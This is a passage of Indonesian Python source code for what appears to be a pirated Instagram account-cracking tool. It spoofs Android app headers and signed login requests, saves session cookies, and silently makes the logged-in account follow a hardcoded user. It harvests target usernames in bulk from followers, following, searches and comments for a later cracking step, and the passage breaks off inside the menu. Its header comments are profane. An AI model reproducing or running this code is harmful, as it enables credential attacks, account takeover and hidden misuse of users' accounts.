#!/usr/bin/env python3
# -*- coding:utf-8

#Dec By FiiXD FiiLexi
#Telegram Bot Decode @Kelvinbot_gantengbot
#PY3 SOURCE CODE ENC KONTOL


# create by Kontol ArifXeyracodev ID 2024
#Premium source kontoll arifxd arifsensei
#Pericod handal langsung prem


try:
    import uuid, pytz, hmac, hashlib, urllib, shutil, base64
    import os, re, sys, json, time, random, datetime, requests
    from Temporary.Secure import Require
    from Temporary.Useragent.Useragent import Useragent
    from rich.tree import Tree
    from rich import print as printz
    from rich.panel import Panel
    from rich.console import Console
    from rich.columns import Columns
    from Penyimpanan.FolderSC.facebook import Facebook
    from Penyimpanan.SecureAkun import SecureIG
    from Temporary.CreateACC.CreateIG import CreateIG
    from bs4 import BeautifulSoup as bs
    from Penyimpanan.Banner import Terminal
    from Penyimpanan.DetedtorsIG import Detedtors
    from Temporary.Terminalize.Styles import style_terminal
    from concurrent.futures import ThreadPoolExecutor

        
dump = []

class Requ:
    def __init__(self) -> None:
        self.proxies = []
        self.MID = {}
        pass      
        
    def SetMid(self):
        return '' if len(self.MID) == 0 else random.choice(self.MID)
        
    def UseNet(self):
        return('MOBILE.LTE','MOBILE(LTE)')
        
    def Android_ID(self, username, password):
        self.xyz = hashlib.md5()
        self.xyz.update(username.encode('utf-8') + password.encode('utf-8'))
        self.hex = self.xyz.hexdigest()
        self.xyz.update(self.hex.encode('utf-8') + '12345'.encode('utf-8'))
        return self.xyz
        
    def HeadersApiLogin(self):
        return {
           'host': 'b.i.instagram.com',
           'x-ig-app-locale': 'in_ID',
           'x-ig-device-locale': 'in_ID',
           'x-ig-mapped-locale': 'id_ID',
           'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
           'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
           'x-ig-bandwidth-speed-kbps': '-1.000',
           'x-ig-bandwidth-totalbytes-b': '0',
           'x-ig-bandwidth-totaltime-ms': '0',
           'x-bloks-version-id': self.Blok_ID(),
           'x-ig-www-claim': '0',
           'x-bloks-is-prism-enabled': 'false',
           'x-bloks-is-layout-rtl': 'false',
           'x-ig-device-id': 'b7b95886-a663-41e4-8025-941a72c9ac4d',
           'x-ig-family-device-id': '2ce88cf6-20e8-4b2e-bb67-8d8ed5dda357',
           'x-ig-android-id': 'android-f4d8eb2bd1b86a47',
           'x-ig-timezone-offset': str(self.timezone_offset()),
           'x-fb-connection-type': self.UseNet()[0],
           'x-ig-connection-type': self.UseNet()[1],
           'x-ig-capabilities': '3brTv10=',
           'x-ig-app-id': '567067343352427',
           'priority': 'u=3',
           'user-agent': 'Instagram 309.1.0.41.113 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 541635863)',
           'accept-language': 'id-ID, en-US',
           'x-mid': str(self.SetMid()),
           'ig-intended-user-id': '0',
           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
           'content-length': '2702',
           'x-fb-http-engine': 'Liger',
           'x-fb-client-ip': 'True',
           'x-fb-server-cluster': 'True'
       }
        
    def Convert_Name(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(f'https://www.instagram.com/{xxx}/', headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}, cookies={'cookie': cookie}).text
                if 'user_id' in str(response):
                    return(re.findall('"user_id":"(\d+)"', str(response))[0])
            except (Exception) as e: pass
            
    def Convert_Url(self, xxx, cookie):
        with requests.Session() as r:
            try:
                response = r.get(xxx, cookies={'cookie': cookie}).text
                if 'media_id' in str(response):
                    return(re.findall('{"media_id":"(.*?)"',str(response))[0])
            except (Exception) as e: exit(e)
            
    def Facebook_Acc(self, cookie):
        with requests.Session() as r:
            try:
                self.csrftoken = re.findall('csrftoken=(.*?);',str(cookie))
                self.headers = {"Host": "www.instagram.com","content-length": "0","x-requested-with": "XMLHttpRequest","x-csrftoken": "tJdFh5wJTuFDQZvpadl2kTm0LGRSkH8w" if len(self.csrftoken) == 0 else self.csrftoken[0],"x-ig-app-id": "936619743392459","x-instagram-ajax": "1011212827","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","content-type": "application/x-www-form-urlencoded","accept": "*/*","x-asbd-id": "129477","cookie": cookie}
                response = r.post('https://www.instagram.com/api/v1/web/fxcal/ig_sso_users/', headers = self.headers).json()
                if 'fbAccount' in str(response):
                    self.nama = response['fbAccount']['display_name']
                    self.response2 = r.get('https://accountscenter.instagram.com/profiles/', cookies = {'cookie':cookie}).text
                    self.username = re.search('{"__typename":"XFBFXFBAccountInfo","id":"(.*?)"}', str(self.response2)).group(1)
                else:
                    self.nama = None
                    self.username = (None)
            except (Exception) as e:
                self.nama = 'Response Error'
                self.username = 'Response Error'
            return('%s|%s'%(self.username, self.nama))

    def Validasi_Username(self, username):
       with requests.Session() as r:
           try:
               response = r.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(username), headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}).json()
               return (
                   response["data"]["user"]["full_name"], 
                   response["data"]["user"]["edge_followed_by"]["count"], 
                   response["data"]["user"]["edge_follow"]["count"], 
                   response["data"]["user"]["edge_owner_to_timeline_media"]["count"],
                   response["data"]["user"]["biography"],
                   response["data"]["user"]["is_private"],
                   response["data"]["user"]["is_verified"],
                   response["data"]["user"]["profile_pic_url"],
                   response["data"]["user"]["profile_pic_url_hd"],response["data"]["user"]["profile_pic_url_hd"]
               )
           except (Exception) as e: return(None,None,None,None,None,None,None,None,None,None)
           
    def DeviceId(self):
        return 'android-%s'%(self.uuid_(True)[:16])

    def uuid_(self, abcd=None, zd=None):
        if zd is not None:
           m = hashlib.md5()
           m.update(zd.encode('utf-8'))
           i = uuid.UUID(m.hexdigest())
        else:
           i = uuid.uuid4()
           if abcd: return str(i.hex)
        return str(i)

    def adid(self, username):
        sha2 = hashlib.sha256()
        sha2.update(username.encode('utf-8'))
        abcd = sha2.hexdigest()
        return self.uuid_(False, abcd)

    def guid(self):
        return self.uuid_(False)

    def poid(self):
        return self.uuid_(False, self.guid())
        
    def Blok_ID(self):
        self.v23 = 'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965'
        self.v39 = 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
        self.v09 = '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        return(random.choice([self.v09,self.v39,self.v23]))
       
    def timezone_offset(self):
        self.tim = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
        self.ofs = self.tim.utcoffset().total_seconds()/60/60
        return self.ofs    
        
    def follow_cookies(self, cookies):
        with requests.Session() as r:
           try:
               r.headers.update({
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                    'x-csrftoken': re.search('csrftoken=(.*?);',str(cookies)).group(1)
                })
               response = r.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("48998009803"), cookies={"cookie": cookies})
           except (Exception) as e: pass  
        
class Login:
    def __init__(self) -> None:
        self.data = 'data/login/'
        pass
        
    def Login_Akun_Instagram(self):
        try:
           Terminal().Banner_Instagram()
           Console(width = 65, style = f"{style_terminal}").print(Panel("[grey50]Silakan Masukan Pilihan Anda, Ketik '[green]cookies[grey50]' Untuk Login Menggunakan Cookie Instagram Dan Ketik '[green]password[grey50]' Untuk Login Menggunakan Username And Password Instagram", title = f"[white]• [green]Login IG [white]•", subtitle = "╭─────", subtitle_align = "left"))
           query = Console().input("[grey50]   ╰─> ")
           if len(query) >0:
               if query == 'cookies' or query == 'Cookies':
                   try:
                       self.Username_And_Password()
                   except (Exception) as e:
                       Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                       exit()       
               elif query == 'password' or query == 'Password':
                   try:
                       Terminal().Banner_Instagram()
                       Console(width = 65, style = f"{style_terminal}").print(Panel("[grey50]Silakan Masukan [green]Username [grey50]And[bold green] Password[grey50], Gunakan Pemisah [red]<=>[grey50] Untuk Username Dengan Password, Pastikan Akun Tidak [yellow]Chekpoint[grey50] Dan Terpasang [red]A2F", title = f"[white]• [green]Username And Password [white]•", subtitle = "╭─────", subtitle_align = "left"))
                       querty = Console().input("[grey50]   ╰─> ")
                       if len(querty) >0:
                           try:
                               self.username = querty.split('<=>')[0]
                               self.password = querty.split('<=>')[1]
                               self.Convert_Username_And_Password(self.username,self.password)
                           except (Exception) as e:
                               Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                               exit()   
                       else:
                           Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan '[green]Username And Password[grey50]'", title = f"[white]• [red]Error Not Found [white]•"))
                           exit()     
                   except (Exception) as e:
                       Console(width = 65, style = "bold grey50").print(Panel(f"[b italic red]{str(e).title()}!", title = "[bold grey50][[bold red] Error [bold grey50]]"))
                       exit()   
               else:
                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Menu Yang Anda Masukan Tidak Terdaftar Di Menu Ini", title = f"[white]• [red]Error Not Found [white]•"))
                   exit()      
           else:
               Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan Pilihan Anda", title = f"[white]• [red]Error Not Found [white]•"))
               exit()          
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()        
        
    def Username_And_Password(self):
        try:
            Terminal().Banner_Instagram()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silakan Masukan Cookie Instagram Akun Pastikan Tidak[yellow] Chekpoint [grey50]Dan Terpasang [red]A2F", title = f"[white]• [green]Exstention Cookie Dough [white]•", subtitle = "╭─────", subtitle_align = "left"))
            cookies = Console().input("[grey50]   ╰─> ")
            if len(cookies) >0:
                self.username, self.fullname = self.Validasi_Cookies(cookies)
                with open(self.data+'.Cookies_IGS.json', mode='w') as wr:
                    wr.write(json.dumps({
                        'Cookie': cookies
                     }))
                    wr.close()
                Requ().follow_cookies(cookies)
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Run.py", title = f"[white]• [green]Success [white]•"))
                exit()
            else:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Anda Tidak Memasukan Apapun, Harap Masukan '[green]Cookie Instagram[grey50]'", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
        except (KeyboardInterrupt, Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()     
            
    def Convert_Username_And_Password(self, username, password):
        byps = requests.Session()
        try:
            hash = hashlib.md5()
            hash.update(username.encode('utf-8') + password.encode('utf-8'))
            hex_ = hash.hexdigest()
            hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8')) 
            ua_generate = ('Instagram 63.0.0.17.94 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 253447817)')
            signed_body = str(random.choice(["7b589ee94c17a18ac2ea9a5247069f1d5f631ba9a37fae36429f10be5dddccfa.","SIGNATURE."]))
            app_instagram = {'signed_body': f'{signed_body}'+str(json.dumps({'id': str(uuid.uuid4()), "server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_custom_transitions_universe,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_session_scoped_logger,ig_android_accoun_switch_badge_fix_universe,ig_android_smartlock_hints_universe,ig_android_black_out,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_android_direct_remove_view_mode_stickiness_universe,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"})),'ig_sig_key_version': '4'}
            byps.headers.update({
                'host': 'b.i.instagram.com',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-ig-connection-speed': f'{str(random.randint(100,999))}kbps',
                'accept': '*/*',
                'x-ig-connection-type': random.choice(['MOBILE(LTE)', 'WIFI']),
                'x-ig-app-id': '936619743392459',
                'accept-encoding': 'br, gzip, deflate',
                'accept-language': 'id-ID',
                'x-ig-abr-connection-Speed-KBPS': '0',
                'user-agent': ua_generate,
                'connection': 'keep-alive',
                'x-ig-capabilities': '36r/dw=='
            })
            response = byps.get('https://b.i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid='+str(uuid.uuid4()), data = app_instagram, allow_redirects=True)
            headers = {
                'host': 'i.instagram.com',
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                'x-bloks-version-id': Requ().Blok_ID(),
                'x-ig-www-claim': '0',
                'x-bloks-is-prism-enabled': 'false',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': f'{str(uuid.uuid4())}',
                'x-ig-family-device-id': f'{str(uuid.uuid4())}',
                'x-ig-android-id': f'android-{hash.hexdigest()[:16]}',
                'x-ig-timezone-offset': str(Requ().timezone_offset()),
                'x-fb-connection-type': ('MOBILE.LTE'),
                'x-ig-connection-type': ('MOBILE(LTE)'),
                'x-ig-capabilities': '3brTv10=',
                'priority': 'u=3',
                'user-agent': ua_generate,
                'accept-language': 'id-ID, en-US',
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
                'x-ig-bandwidth-speed-kbps': '{}'.format(random.randint(100,300)),
                'x-ig-bandwidth-totalbytes-b': str(random.randint(500000,900000)),
                'x-ig-bandwidth-totaltime-ms': str(random.randint(1000,9000)),
                'x-ig-app-id': '3419628305025917',
                'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                'connection': 'keep-alive'
                }
            payload = json.dumps({
                 'phone_id': str(uuid.uuid4()),
                 '_csrftoken': response.cookies.get('csrftoken','TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E'),
                 'username': username,
                 'guid': str(uuid.uuid4()),
                 'device_id': 'android-'+str(uuid.uuid4()),
                 'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),password),
                 'login_attempt_count': '0',
               })
            encode = hmac.new('4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'.encode('utf-8'),payload.encode('utf-8'),hashlib.sha224).hexdigest() +'.'+ urllib.parse.quote(payload)
            response2 = byps.post('https://b.i.instagram.com/api/v1/accounts/login/', data = (f'ig_sig_key_version=4&signed_body={encode}'), headers = headers, allow_redirects=True).text
            if 'logged_in_user' in str(response2):
               try: cookies = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
               except (Exception) as e: cookie = (None)
               Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]{cookies}", title = f"[white]• [green]Logged In User [white]•"))
               if len(cookies) >0:
                   self.username, self.fullname = self.Validasi_Cookies(cookies)
                   with open(self.data+'.Cookies_IGS.json', mode='w') as wr:
                        wr.write(json.dumps({
                            'Cookie': cookies
                         }))
                        wr.close()
                   Requ().follow_cookies(cookies)
                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Selamat Datang [green]{self.username}[grey50]/[green]{self.fullname}[grey50], Run Ulang Perintahnya [green]python Run.py", title = f"[white]• [green]Success [white]•"))
                   exit()
               else:
                   Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Cookie Anda Perkiraan Akun [yellow]Chekpoint[grey50] Atau [red]Invalid[grey50], Silakan Chek Akun Anda Atau Ganti Tumbal Lain", title = f"[white]• [red]Error Not Found [white]•"))
                   exit()
            elif 'two_factor_required' in str(response2):
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Akun Anda, Akun Anda Terpasang [red]A2F", title = f"[white]• [red]Logged A2F [white]•"))
                exit()
            elif 'challenge_required' in str(response2):
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Akun Anda, Akun Anda [yellow]Chekpoint", title = f"[white]• [yellow]Logged Chekpoint [white]•"))
                exit()
            elif 'ip_block' in str(response2):
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Terjadi Kesalahan Ip Anda Terblokir, Silakan Mode Pesawat 5 Detik", title = f"[white]• [red]Ip Block [white]•"))
                exit()
            else:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Terjadi Kesalahan [green]Username[grey50] Atau [green]Password[grey50] Yang Anda Masukan Salah, Silakan Cek [green]Username[grey50] Dan [green]Password[grey50] Anda Pastikan Benar", title = f"[white]• [red]Logged Error [white]•"))
                exit()
        except (KeyboardInterrupt, Exception, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()   
        
    def Validasi_Cookies(self, cookies):
        with requests.Session() as r:
            r.headers.update({
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            })
            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.search('ds_user_id=(\d+)',str(cookies)).group(1)), cookies = {
                'cookie': cookies
            })
            self.payload = json.loads(response.text)
            if "'status': 'ok'" in str(self.payload):
                self.username = self.payload['user']['username']
                self.fullname = self.payload['user']['full_name']
                return(self.username, self.fullname)
            else:
                Terminal().clear_terminalize()
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Opss, Tidak Dapat Mengakses Cookie Anda Perkiraan Akun [yellow]Chekpoint[grey50] Atau [red]Invalid[grey50], Silakan Chek Akun Anda Atau Ganti Tumbal Lain", title = f"[white]• [red]Error Not Found [white]•"))
                time.sleep(3.5)
                self.Login_Akun_Instagram()
                
class Instagram:
    def __init__(self):
        self.password_manual, self.masukan_sandi, self.amankan_akun, self.unlimited, self.useragent = [],[],[],[],[]
        self.success, self.chekpoint, self.faktor, self.sandi_salah,self.looping = 0,0,0,0,0
        self.Create_Dir()
        self.data = ('data/login/')
        
    def Create_Dir(self):
        try: os.mkdir('/sdcard/OK')
        except: pass
        try: os.mkdir('/sdcard/2F')
        except: pass
        try: os.mkdir('/sdcard/CP')
        except: pass 
        try: os.mkdir('/sdcard/data')
        except: pass 
        try: os.mkdir('/sdcard/data/login')
        except: pass 
        
    def Kalender(self):
        struct_time = time.localtime(time.time())
        return (
            time.strftime('%d', struct_time),
            time.strftime('%B', struct_time),
            time.strftime('%Y', struct_time)
        )
        
    def Simpan_Result(self):
        tanggal, bulan, tahun = self.Kalender()
        return(f'{tanggal}-{bulan}-{tahun}')
            
    def Remove_Cookie(self):
        try: os.system(f'rm -rf {self.data}.Cookies_IGS.json')
        except (Exception) as e:
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[italic grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
        Login().Login_Akun_Instagram()

    def Chek_Cookies(self, created, exspired, sisa):
        try:
           cookies = json.loads(open(self.data+'.Cookies_IGS.json', mode='r').read())['Cookie']
           self.Menu_Instagram(created, exspired, sisa, cookies)          
        except (FileNotFoundError) as e:
           Terminal().clear_terminalize()
           Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
           time.sleep(3.5)
           self.Remove_Cookie()
           
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        try:
            self.username, self.fullname = Login().Validasi_Cookies(cookie)
        except (KeyError) as e:
            Terminal().clear_terminalize()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            time.sleep(3.5)
            self.Remove_Cookie() 
                        
        except (requests.exceptions.ConnectionError) as e:
            Terminal().clear_terminalize()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            time.sleep(3.5)
            self.Remove_Cookie() 
        try:                     
            Terminal().Banner_Instagram()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]•[grey50]. Exspired : [green]{exspired}", title = f"[white]• [green]Detail Pengguna [white]•", subtitle = f"[white]• [grey50]Sisa [red]{sisa} [grey50]Hari Lagi [white]•[green]•[grey50]. Username : [green]{self.username}", subtitle_align = "center"))
            #Console(width = 65, style = f"{style_terminal}").print(Panel(f"[green]•[grey50]. Username : [green]{self.username} \t[green]•[grey50]. Fullname [green]{self.fullname}", title = f"[white]• [green]Username And Fullname [white]•"))
        except (AttributeError) as e:
            Terminal().clear_terminalize()
            Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
            exit()
        Console().print(Columns([Panel('[green]01[grey50]. Dump dari followers\n[green]02[grey50]. Dump dari following\n[green]03[grey50]. Dump dari pencarian\n[green]04[grey50]. Dump dari komentar\n[green]05[grey50]. Dump dari likers\n[green]06[grey50]. Dump no limited', width=32, style = f"{style_terminal}", subtitle = "╭─────", subtitle_align = "left"), Panel('[green]07[grey50]. Amankan akun manual\n[green]08[grey50]. Cek detedtor chekpoint\n[green]09[grey50]. Cek result crack\n[green]10[grey50]. Create akun instagram\n[green]11[grey50]. Beralih ke facebook\n[red]E[grey50]. Exit/Hapus [red]cookies', width=32, style = f"{style_terminal}")]))
        query = Console().input("[grey50]   ╰─> ")
        if query == '01' or query == '1':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Khusus Untuk Akun '[blue]Centang Biru[grey50]' Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Followers(True,uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 Username",  title = f"[white]• [red]Dump Sedikit [white]•"))
                    exit()
                else:
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '02' or query == '2':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Khusus Untuk Akun '[blue]Centang Biru[grey50]' Bisa Di Dump, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                for self.username in username.split(','):
                    uid = Requ().Convert_Name(self.username, cookie)
                try: self.Dump_Following(False, uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 Username",  title = f"[white]• [red]Dump Sedikit [white]•"))
                    exit()
                else:
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '03' or query == '3':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram, Anda Juga Bisa Menggunakan Koma Untuk Dump Masal, Misalnya : [green]ArifXeyracodev_dev02, ArifXeyracodev_dev03[grey50] Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                for self.username in username.split(','):
                    try: self.Dump_Search(self.username, cookie)
                    except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 Username",  title = f"[white]• [red]Dump Sedikit [white]•"))
                    exit()
                else:
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '04' or query == '4':
            try:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Silahkan Masukan '[green]Link Postingan[grey50]' Akun Instagram Target Pastikan Tidak '[red]Terkunci[grey50]' Dan '[blue]Centang Biru[grey50]' Anda Juga Bisa Menggunakan Koma Untuk Dump Masal Dan Gunakan [red]Ctrl + C[grey50] Untuk Berhenti Dump", title = f"[white]• [green]Catatan [white]•", subtitle = "╭─────", subtitle_align = "left"))
                username = Console().input("[grey50]   ╰─> ")
                for self.username in username.split(','):
                    uid = Requ().Convert_Url(self.username, cookie)
                try: self.Dump_Komentar(uid, cookie, '')
                except (Exception) as e: pass
                if len(dump) < 50:
                    Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]Jumlah Dump Terlalu Sedikit Anda Harus Mencari Target Lain Dan Pastikan Target Terkumpul Lebih Dari 50 Username",  title = f"[white]• [red]Dump Sedikit [white]•"))
                    exit()
                else:
                    self.Methode()
            except (Exception) as e:
                Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                exit()
                
        elif query == '05' or query == '5':
            try:
